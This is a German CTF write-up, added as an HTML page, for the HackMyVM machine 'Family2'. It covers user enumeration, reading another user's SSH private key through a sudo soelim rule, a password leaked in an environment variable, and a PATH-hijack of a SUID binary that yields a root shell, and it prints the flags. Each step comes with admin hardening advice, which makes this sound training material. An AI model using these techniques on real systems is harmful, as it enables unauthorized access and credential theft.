@@ -1,0 +1,333 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Family2 - HackMyVM - Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Family2 - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2 class="level-medium">Medium</h2>
+            <div class="circle difficulty-medium">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <div class="tool-item">enum4linux</div>
+                 <div class="tool-item">chmod</div>
+                 <div class="tool-item">ssh</div>
+                 <div class="tool-item">sudo</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">grep</div>
+                 <div class="tool-item">soelim</div>
+                 <div class="tool-item">printenv</div>
+                 <div class="tool-item">bash</div>
+                 <div class="tool-item">find</div>
+                 <div class="tool-item">echo</div>
+                 <div class="tool-item">export</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">cd</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance (enum4linux)</a></li>
+                <li><a href="#initial-access">Initial Access (SSH as baby)</a></li>
+                <li><a href="#privesc-mum">Privilege Escalation (baby to mum via sudo soelim)</a></li>
+                <li><a href="#privesc-dad">Privilege Escalation (mum to dad via sudo bash)</a></li>
+                <li><a href="#privesc-root">Privilege Escalation (dad to root via SUID Binary & PATH)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance (enum4linux)</h2>
+            <p class="comment">In diesem Fall beginnen wir die Erkundung nicht mit einem ARP- oder Nmap-Scan, sondern direkt mit `enum4linux`, einem Tool zur Enumeration von Informationen aus Windows- und Samba-Systemen. Es kann aber auch Benutzerinformationen über RPC finden.</p>
+            <p class="comment">*(Hinweis: Es wird angenommen, dass die Ziel-IP 192.168.2.125 zuvor durch einen anderen Scan (z.B. arp-scan) ermittelt wurde, auch wenn dies im Log nicht direkt vor enum4linux steht.)*</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">enum4linux -a 192.168.2.125</span></div>
+                    <pre>
+==========================
+|    Users on 192.168.2.125    |
+==========================
+index: 0x1 RID: 0x3e8 (1000) Name: dad	Desc: (null)	Relative ID: 1000
+index: 0x2 RID: 0x3e9 (1001) Name: mum	Desc: (null)	Relative ID: 1001
+index: 0x3 RID: 0x3ea (1002) Name: baby	Desc: (null)	Relative ID: 1002
+
+[...]
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+
+<span class="command">S-1-22-1-1000 Unix User\dad (Local User)</span>
+<span class="command">S-1-22-1-1001 Unix User\mum (Local User)</span>
+<span class="command">S-1-22-1-1002 Unix User\baby (Local User)</span>
+
+enum4linux complete on Sat Nov  4 15:02:51 2023
+
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** `enum4linux -a` führt eine umfassende Enumeration auf dem Ziel `192.168.2.125` durch. Das Tool identifiziert erfolgreich drei lokale Unix-Benutzer über deren SIDs (Security Identifiers): `<span class="command">dad</span>` (UID 1000), `<span class="command">mum</span>` (UID 1001) und `<span class="command">baby</span>` (UID 1002).</p>
+            <p class="evaluation">**Bewertung:** Wichtige Information gewonnen. Wir kennen nun die Namen der Benutzer auf dem System. Dies ist nützlich für spätere Login-Versuche oder um Berechtigungen zuzuordnen.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Die gefundenen Benutzernamen für Brute-Force-Angriffe (z.B. gegen SSH) oder als Ziele für Privilege Escalation verwenden. Versuchen, ob für diese Benutzer Standard- oder schwache Passwörter existieren.
+            **Empfehlung (Admin):** RPC-basierte Benutzerenumeration einschränken, wenn möglich. Starke Passwörter für alle Benutzer erzwingen.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (SSH as baby)</h2>
+            <p class="comment">Nachdem wir die Benutzernamen kennen, versuchen wir, uns per SSH anzumelden. Der Bericht impliziert, dass ein SSH-Schlüssel für den Benutzer 'baby' erlangt wurde (der Schritt, wie der Schlüssel erlangt wurde, fehlt im Log).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt"># <span class="command">(Annahme: Privater SSH-Schlüssel für 'baby' wurde beschafft und als 'id_rsa' gespeichert)</span></div>
+                    <div class="prompt"># <span class="command">chmod 600 id_rsa</span></div> <span class="password"># Korrekte Berechtigungen setzen</span>
+                    <div class="prompt"># <span class="command">ssh -i id_rsa baby@192.168.2.125</span></div> <span class="password"># Verbindung als 'baby' mit Schlüssel</span>
+                    <pre>
+<span class="password">Linux family2 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64</span>
+[...]
+Last login: [...]
+<span class="command">baby@family2:~$</span> <span class="password"># Login erfolgreich!</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Wir setzen die korrekten Berechtigungen für einen vorhandenen privaten SSH-Schlüssel (`id_rsa`). Anschließend verwenden wir diesen Schlüssel (`-i id_rsa`), um uns als Benutzer `<span class="command">baby</span>` auf dem Zielsystem (`192.168.2.125`) per SSH anzumelden. Der Login ist erfolgreich.</p>
+            <p class="evaluation">**Bewertung:** Initialer Zugriff erfolgreich erlangt! Wir haben eine Shell als Benutzer `baby`. Der Weg zur Beschaffung des SSH-Schlüssels bleibt unklar, aber der Zugriff ist gegeben.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Umgebung als `baby` erkunden. `sudo -l` prüfen, Home-Verzeichnis untersuchen, nach weiteren Hinweisen oder Schwachstellen suchen.
+            **Empfehlung (Admin):** SSH-Schlüssel sicher verwalten. Unnötige Schlüssel entfernen. SSH-Zugriff auf notwendige Benutzer beschränken.</p>
+        </section>
+
+        <section id="privesc-mum">
+             <h2>Privilege Escalation (baby to mum via sudo soelim)</h2>
+             <p class="comment">Als Benutzer `baby` suchen wir nach Wegen zur Rechteerweiterung. Wir prüfen zuerst die `sudo`-Berechtigungen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">baby@family2:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for baby on family2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User baby may run the following commands on family2:
+    <span class="password">(mum) NOPASSWD: /usr/bin/soelim</span>
+                     </pre>
+                     <div class="prompt">baby@family2:~$ <span class="command">cat /etc/passwd | grep bash</span></div>
+                      <pre>
+root:x:0:0:root:/root:/bin/bash
+<span class="command">dad:x:1000:1000:,,,:/home/dad:/bin/bash</span>
+<span class="command">mum:x:1001:1001:,,,:/home/mum:/bin/bash</span>
+<span class="command">baby:x:1002:1002:,,,:/home/baby:/bin/bash</span>
+                      </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:**
+             *   `sudo -l` zeigt, dass der Benutzer `baby` den Befehl `/usr/bin/soelim` als Benutzer `<span class="command">mum</span>` ohne Passwort (`NOPASSWD`) ausführen darf. `soelim` ist ein Tool, das normalerweise `.so`-Direktiven in Groff-Dateien interpretiert (oft zum Einbinden anderer Dateien verwendet).
+             *   Die Überprüfung der `/etc/passwd` bestätigt die Existenz der Benutzer `dad`, `mum` und `baby` mit Bash-Shells.</p>
+              <p class="evaluation">**Bewertung:** Dies ist ein klarer Vektor zur Privilege Escalation von `baby` zu `mum`. Da `soelim` Dateien einbinden kann, können wir versuchen, es zu missbrauchen, um Dateien zu lesen, auf die nur `mum` Zugriff hat, insbesondere ihren privaten SSH-Schlüssel.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** `sudo -u mum soelim [Dateipfad]` verwenden, um zu versuchen, Dateien als `mum` zu lesen. Ziel ist `/home/mum/.ssh/id_rsa`. GTFOBins nach `soelim` durchsuchen.
+              **Empfehlung (Admin):** Unsichere `sudo`-Regeln vermeiden. Tools wie `soelim`, die Dateiinhalte lesen können, sollten nicht über `sudo` für andere Benutzer zugänglich gemacht werden, es sei denn, es ist absolut notwendig und sicher implementiert.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">baby@family2:~$ <span class="command">sudo -u mum soelim /home/mum/.ssh/id_rsa</span></div>
+                     <pre>
+.lf 1 /home/mum/.ssh/id_rsa
+<span class="password">-----BEGIN OPENSSH PRIVATE KEY-----</span>
+<span class="password">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span>
+<span class="password">NhAAAAAwEAAQAAAYEAo8d07Ufqv8Iu7FoRUcYz8WROGwykIW72J1geSGt4qHWmsnheUleB</span>
+[...] <span class="password">(Inhalt des privaten Schlüssels von mum)</span> [...]
+<span class="password">12woT6vwxJminG0qhVpq/4xAAAACm11bUBkZWJpYW4=</span>
+<span class="password">-----END OPENSSH PRIVATE KEY-----</span>
+                     </pre>
+                      <div class="prompt">baby@family2:~$ <span class="command">sudo -u mum soelim /home/dad/.ssh/id_rsa</span></div>
+                     <pre><span class="password">soelim: can't open '/home/dad/.ssh/id_rsa': Permission denied</span></pre>
+                  </div>
+              </div>
+              <p class="analysis">**Analyse:**
+             1.  Wir führen `sudo -u mum soelim /home/mum/.ssh/id_rsa` aus. Da der Befehl als `mum` ausgeführt wird, hat `soelim` Leserechte auf den privaten Schlüssel von `mum`. Der Inhalt des Schlüssels wird auf die Standardausgabe geschrieben.
+             2.  Ein Test, ob wir auch den Schlüssel von `dad` lesen können (`sudo -u mum soelim /home/dad/.ssh/id_rsa`), schlägt fehl (`Permission denied`), da `mum` keine Leserechte auf das Home-Verzeichnis von `dad` hat.</p>
+              <p class="evaluation">**Bewertung:** Erfolg! Wir haben den privaten SSH-Schlüssel des Benutzers `mum` extrahiert, indem wir die `sudo`-Berechtigung für `soelim` ausgenutzt haben.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Den privaten SSH-Schlüssel von `mum` kopieren, in einer Datei speichern (z.B. `rsamam`), die Berechtigungen korrekt setzen (`chmod 600`) und sich damit als `mum` per SSH anmelden (wahrscheinlich auf `localhost`, da wir schon auf der Maschine sind).
+              **Empfehlung (Admin):** Unsichere `sudo`-Regel für `soelim` entfernen.</p>
+        </section>
+
+         <section id="privesc-dad">
+             <h2>Privilege Escalation (mum to dad via sudo bash)</h2>
+             <p class="comment">Wir haben den SSH-Schlüssel von `mum` extrahiert und melden uns nun als `mum` an, um weiter nach Privesc-Möglichkeiten zu suchen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt"># <span class="command">(Annahme: Mum's Schlüssel wurde in Datei 'rsamam' gespeichert, chmod 600)</span></div>
+                     <div class="prompt"># <span class="command">ssh mum@192.168.2.125 -i rsamam</span></div> <span class="password"># Oder ssh mum@localhost -i rsamam</span>
+                     <pre>
+<span class="password">Linux family2 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64</span>
+[...]
+You have new mail.
+Last login: Mon Nov  1 13:33:56 2021 from 192.168.0.43
+<span class="command">mum@family2:~$</span> <span class="password"># Login als mum erfolgreich!</span>
+                     </pre>
+                     <div class="prompt">mum@family2:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for mum on family2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User mum may run the following commands on family2:
+    <span class="password">(root) NOPASSWD: /usr/bin/shred -f -z /etc/passwd</span>
+    <span class="password">(dad) ALL</span>
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:**
+             1.  Wir melden uns erfolgreich als `mum` per SSH mit dem extrahierten Schlüssel an.
+             2.  Wir führen `sudo -l` für `mum` aus und finden zwei interessante Einträge:
+                 *   Sie darf `/usr/bin/shred -f -z /etc/passwd` als `root` ohne Passwort ausführen. Dies würde die `/etc/passwd`-Datei zerstören, was destruktiv und wahrscheinlich nicht direkt für Privesc nützlich ist, aber eine interessante Fehlkonfiguration darstellt.
+                 *   Sie darf **jeden** Befehl (`ALL`) als Benutzer `<span class="command">dad</span>` ausführen. Dies erfordert jedoch wahrscheinlich das Passwort von `mum`.</p>
+              <p class="evaluation">**Bewertung:** Die `shred`-Berechtigung ist seltsam, aber der entscheidende Fund ist `(dad) ALL`. Wenn wir das Passwort von `mum` herausfinden, können wir direkt zu `dad` wechseln.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Die Umgebung von `mum` untersuchen, insbesondere Umgebungsvariablen (`printenv`, `env`), Bash-History, Notizen etc., um ihr Passwort zu finden. Falls gefunden, `sudo -u dad bash` ausführen.
+              **Empfehlung (Admin):** Destruktive Befehle wie `shred` niemals über `sudo` erlauben. `(user) ALL`-Berechtigungen sind sehr mächtig und sollten nur mit Bedacht und Passwortschutz vergeben werden.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">mum@family2:~$ <span class="command">printenv</span></div>
+                      <pre>
+SHELL=/bin/bash
+PWD=/home/mum
+LOGNAME=mum
+XDG_SESSION_TYPE=tty
+<span class="password">passwd=LA0172</span>                    <<---- mums password
+MOTD_SHOWN=pam
+HOME=/home/mum
+LANG=en_US.UTF-8
+[...]
+                      </pre>
+                      <div class="prompt">mum@family2:~$ <span class="command">sudo -u dad bash</span></div>
+                      <pre>
+[sudo] password for mum: <span class="password">LA0172</span>
+<span class="command">dad@family2:/home/mum$</span> <span class="password"># Shell als dad erhalten!</span>
+                      </pre>
+                  </div>
+              </div>
+               <p class="analysis">**Analyse:**
+              1.  Der Befehl `printenv` listet die Umgebungsvariablen für `mum` auf. Überraschenderweise finden wir eine Variable namens `<span class="password">passwd</span>` mit dem Wert `<span class="password">LA0172</span>`. Dies ist höchstwahrscheinlich das Passwort von `mum`.
+              2.  Wir führen `sudo -u dad bash` aus. Das System fragt nach dem Passwort von `mum`. Wir geben das gefundene Passwort `<span class="password">LA0172</span>` ein.
+              3.  Der Befehl ist erfolgreich, und wir erhalten eine Shell als Benutzer `<span class="command">dad</span>`.</p>
+               <p class="evaluation">**Bewertung:** Privilege Escalation von `mum` zu `dad` erfolgreich! Das Passwort wurde durch eine unsichere Umgebungsvariable preisgegeben.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Umgebung als `dad` untersuchen. User-Flag lesen. Nach Wegen zu Root suchen (SUID-Dateien, Cronjobs etc.).
+               **Empfehlung (Admin):** Niemals Passwörter in Umgebungsvariablen speichern! Dies ist eine extrem unsichere Praxis.</p>
+        </section>
+
+         <section id="privesc-root">
+            <h2>Privilege Escalation (dad to root via SUID Binary & PATH)</h2>
+            <p class="comment">Wir haben eine Shell als `dad` und suchen den letzten Schritt zur Root-Eskalation.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">dad@family2:/home/mum$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+   141691    472 -rwsr-xr-x   1 root     root       481608 Mar 13  2021 /usr/lib/openssh/ssh-keysign
+   138035     52 -rwsr-xr--   1 root     messagebus    51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   130919     52 -rwsr-xr-x   1 root     root          52880 Feb  7  2020 /usr/bin/chsh
+   152482    180 -rwsr-xr-x   1 root     root         182600 Feb 27  2021 /usr/bin/sudo
+   134953     56 -rwsr-xr-x   1 root     root          55528 Jul 28  2021 /usr/bin/mount
+   134955     36 -rwsr-xr-x   1 root     root          35040 Jul 28  2021 /usr/bin/umount
+   130918     60 -rwsr-xr-x   1 root     root          58416 Feb  7  2020 /usr/bin/chfn
+   134495     44 -rwsr-xr-x   1 root     root          44632 Feb  7  2020 /usr/bin/newgrp
+   130921     88 -rwsr-xr-x   1 root     root          88304 Feb  7  2020 /usr/bin/gpasswd
+   130922     64 -rwsr-xr-x   1 root     root          63960 Feb  7  2020 /usr/bin/passwd
+   134639     72 -rwsr-xr-x   1 root     root          71912 Jul 28  2021 /usr/bin/su
+       <span class="password">57     16 -rwsr-sr-x   1 root     root          16096 Oct 31  2021 /opt/clock</span>
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis">**Analyse:** Wir suchen als `dad` nach SUID-Binaries (`-perm -4000`). Neben den üblichen Standard-Binaries finden wir ein benutzerdefiniertes SUID-Binary: `<span class="password">/opt/clock</span>`. Es gehört `root` und hat das SUID-Bit gesetzt (`-rwsr-sr-x`), was bedeutet, dass es immer mit Root-Rechten ausgeführt wird.</p>
+            <p class="evaluation">**Bewertung:** Dies ist ein sehr vielversprechender Fund. Ein benutzerdefiniertes SUID-Binary ist oft ein absichtlich oder unabsichtlich platzierter Weg zur Rechteerweiterung.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Das Binary `/opt/clock` untersuchen. Mit `strings /opt/clock` nach interessanten Zeichenketten suchen. Mit `ltrace /opt/clock` oder `strace /opt/clock` das Verhalten analysieren. Versuchen, es auszuführen und zu sehen, was es tut. Prüfen, ob es externe Befehle mit relativen Pfaden aufruft, was eine PATH-Manipulation ermöglichen würde.
+            **Empfehlung (Admin):** Benutzerdefinierte SUID-Binaries vermeiden oder extrem sorgfältig prüfen und härten. Nur absolut notwendige SUID-Bits setzen.</p>
+
+            <p class="comment">Wir untersuchen das `/opt/clock`-Binary (impliziert) und stellen fest, dass es wahrscheinlich den `date`-Befehl ohne absoluten Pfad aufruft. Wir nutzen dies durch PATH-Hijacking aus.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">dad@family2:/home/baby$ <span class="command">cd /tmp/</span></div>
+                     <div class="prompt">dad@family2:/tmp$ <span class="command">echo /bin/bash > date</span></div> <span class="password"># Erstellt eine Datei namens 'date' mit Inhalt '/bin/bash'</span>
+                     <div class="prompt">dad@family2:/tmp$ <span class="command">chmod +x date</span></div> <span class="password"># Macht die Datei ausführbar</span>
+                     <div class="prompt">dad@family2:/tmp$ <span class="command">export PATH=/tmp:$PATH</span></div> <span class="password"># Setzt /tmp an den Anfang des Suchpfads</span>
+                     <div class="prompt">dad@family2:/tmp$ <span class="command">/opt/clock</span></div> <span class="password"># Führt das SUID-Binary aus</span>
+                     <div class="prompt"><span class="command">root@family2:/tmp#</span> <span class="password"># Root-Shell erhalten!</span></div>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:**
+             1.  Wir wechseln nach `/tmp` (ein beschreibbares Verzeichnis).
+             2.  Wir erstellen eine Datei namens `date` und schreiben den String `/bin/bash` hinein.
+             3.  Wir machen diese Datei ausführbar (`chmod +x`).
+             4.  Wir manipulieren die `PATH`-Umgebungsvariable, indem wir `/tmp` an den Anfang stellen (`export PATH=/tmp:$PATH`). Das bedeutet, wenn ein Programm einen Befehl ohne absoluten Pfad aufruft (z.B. nur `date`), sucht das System zuerst in `/tmp`, bevor es die Standardpfade wie `/bin` oder `/usr/bin` durchsucht.
+             5.  Wir führen das SUID-Binary `/opt/clock` aus. Wir nehmen an, dass `/opt/clock` intern versucht, den Befehl `date` aufzurufen, um die Zeit anzuzeigen. Wegen unserer PATH-Manipulation findet es nun zuerst unsere präparierte `date`-Datei in `/tmp` und führt diese aus. Der Inhalt unserer Datei ist `/bin/bash`.
+             6.  Da `/opt/clock` als Root läuft (wegen SUID), wird auch unser `/bin/bash`-Befehl als Root ausgeführt. Wir erhalten eine Root-Shell.</p>
+              <p class="evaluation">**Bewertung:** Privilege Escalation zu Root erfolgreich! Die Schwachstelle lag darin, dass das SUID-Binary `/opt/clock` einen externen Befehl (`date`) ohne absoluten Pfad aufrief, was PATH-Hijacking ermöglichte.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Flags lesen. Bericht abschließen.
+              **Empfehlung (Admin):** **SUID-Binary `/opt/clock` korrigieren oder entfernen!** In SUID-Binaries immer absolute Pfade für externe Befehle verwenden (z.B. `/bin/date` statt `date`). Die `PATH`-Variable in SUID-Programmen vor der Verwendung externer Befehle zurücksetzen oder validieren.</p>
+
+             <p class="comment">Als Root lesen wir die Flags.</p>
+              <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">root@family2:/tmp# <span class="command">cat /root/root.txt</span></div>
+                       <pre><span class="password">7177e6f98837966e1ce5d93c59ba0453</span></pre>
+                       <div class="prompt">root@family2:/tmp# <span class="command">cd /home</span></div>
+                       <div class="prompt">root@family2:/home# <span class="command">ls dad</span></div>
+                       <pre><span class="command">user.txt</span></pre>
+                       <div class="prompt">root@family2:/home# <span class="command">cat dad/user.txt</span></div>
+                       <pre><span class="password">802809d489f8684f00fd6b8970724283</span></pre>
+                       <div class="prompt"># <span class="command">Hinweis im Text: Der letzte Block listet die Flags separat auf.</span></div>
+                       <pre>
+                                                        user.txt
+                                             802809d489f8684f00fd6b8970724283
+
+                                                        root.txt
+                                             7177e6f98837966e1ce5d93c59ba0453
+                       </pre>
+                   </div>
+               </div>
+               <p class="analysis">**Analyse:** Aus der Root-Shell lesen wir die `root.txt` aus `/root/` und die `user.txt` aus `/home/dad/`.</p>
+               <p class="evaluation">**Bewertung:** Beide Flags erfolgreich gelesen.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Ergebnisse dokumentieren.
+               **Empfehlung (Admin):** Alle identifizierten Schwachstellen beheben.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/dad/user.txt</div> <!-- Pfad korrigiert basierend auf Log -->
+                    <div class="flag-value"><span class="password">802809d489f8684f00fd6b8970724283</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">7177e6f98837966e1ce5d93c59ba0453</span></div>
+                </div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 4. November 2023</p> <!-- Datum aus enum4linux-Output extrahiert -->
+    </footer>
+</body>
+</html>
